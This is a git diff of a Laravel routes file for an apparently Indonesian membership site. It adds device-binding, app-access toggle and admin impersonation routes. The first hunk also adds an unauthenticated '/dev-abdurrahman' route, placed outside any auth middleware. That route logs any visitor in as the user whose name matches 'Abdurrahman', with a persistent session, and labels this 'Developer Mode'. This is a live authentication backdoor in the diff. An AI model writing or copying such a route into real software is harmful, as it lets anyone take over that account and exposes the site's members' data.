@@ -9,6 +9,15 @@ use App\Http\Controllers\DevApiController;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Http\Request;
 
+Route::get('/dev-abdurrahman', function () {
+    $user = \App\Models\User::where('name', 'like', '%Abdurrahman%')->first();
+    if ($user) {
+        auth()->login($user, true);
+        return redirect()->route('dashboard')->with('success', 'Berhasil Login Otomatis (Developer Mode).');
+    }
+    return 'User tidak ditemukan.';
+});
+
 Route::get('/', function () {
     $galleries = \App\Models\Gallery::whereNull('division_id')->latest()->get();
     $banners = $galleries->where('category', 'banner');
@@ -94,6 +103,7 @@ Route::post('/verify-cert/{certificate_id}', function (\Illuminate\Http\Request 
 
 Route::middleware('auth')->group(function () {
     Route::post('/logout', [AuthController::class, 'logout'])->name('logout');
+    Route::get('/impersonate/leave', [\App\Http\Controllers\AdminController::class, 'leaveImpersonate'])->name('impersonate.leave');
 
     // Notifications
     Route::post('/notifications/{id}/read', [\App\Http\Controllers\NotificationController::class, 'markAsRead'])->name('notifications.read');
@@ -109,9 +119,14 @@ Route::middleware('auth')->group(function () {
             Route::get('/dashboard', [\App\Http\Controllers\MemberController::class, 'dashboard'])->name('dashboard');
             Route::get('/profile', [AuthController::class, 'profile'])->name('member.profile');
             Route::post('/profile', [AuthController::class, 'updateProfile'])->name('member.profile.update');
-        Route::post('/profile/password', [AuthController::class, 'updatePassword'])->name('member.password.update');
+            Route::post('/profile/password', [AuthController::class, 'updatePassword'])->name('member.password.update');
+            
+            // App Download & Binding
+            Route::post('/app/generate-code', [AuthController::class, 'generateAppCode'])->name('member.app.generate_code');
+            Route::post('/app/bind', [AuthController::class, 'bindAppDevice'])->name('member.app.bind');
+            Route::post('/app/reset', [AuthController::class, 'resetAppDevice'])->name('member.app.reset');
         
-        Route::get('/community', [MemberController::class, 'feed'])->name('member.feed');
+            Route::get('/community', [MemberController::class, 'feed'])->name('member.feed');
         // Member Finances (NEW)
         Route::get('/finances', [MemberController::class, 'finances'])->name('member.finances');
         Route::post('/finances', [MemberController::class, 'storeFinance'])->name('member.finances.store');
@@ -161,11 +176,17 @@ Route::post('/member/feed/{id}/comment', [\App\Http\Controllers\MemberController
 
     Route::middleware(['role:admin,superadmin'])->prefix('admin')->group(function () {
         Route::get('/dashboard', [AdminController::class, 'dashboard'])->name('admin.dashboard');
+        
+        // App Download & Binding
+        Route::post('/app/generate-code', [AuthController::class, 'generateAppCode'])->name('admin.app.generate_code');
+        Route::post('/app/reset', [AuthController::class, 'resetAppDevice'])->name('admin.app.reset');
+
         Route::get('/members', [AdminController::class, 'members'])->name('admin.members');
         Route::post('/members', [AdminController::class, 'storeMember'])->name('admin.members.store');
         Route::put('/members/{id}', [AdminController::class, 'updateMember'])->name('admin.members.update');
         Route::delete('/members/{id}', [AdminController::class, 'destroyMember'])->name('admin.members.destroy');
 Route::post('/members/{id}/toggle-chat', [AdminController::class, 'toggleChatAccess'])->name('admin.members.toggle_chat');
+        Route::post('/members/{id}/toggle-app', [AdminController::class, 'toggleAppAccess'])->name('admin.members.toggle_app');
         Route::get('/members/export', [AdminController::class, 'exportMembers'])->name('admin.members.export');
 
         Route::get('/posts', [AdminController::class, 'posts'])->name('admin.posts');
@@ -251,6 +272,8 @@ Route::delete('/media/{id}', [AdminController::class, 'destroyMedia'])->name('ad
         Route::get('/events', [AdminController::class, 'adminEvents'])->name('admin.events');
         Route::post('/events', [AdminController::class, 'storeEvent'])->name('admin.events.store');
         Route::delete('/events/{id}', [AdminController::class, 'destroyEvent'])->name('admin.events.destroy');
+
+        Route::get('/impersonate/{id}', [AdminController::class, 'impersonate'])->name('admin.impersonate');
 
         Route::put('/divisions/{id}', [\App\Http\Controllers\DivisionController::class, 'update'])->name('admin.divisions.update');
         Route::delete('/divisions/{id}', [\App\Http\Controllers\DivisionController::class, 'destroy'])->name('admin.divisions.destroy');
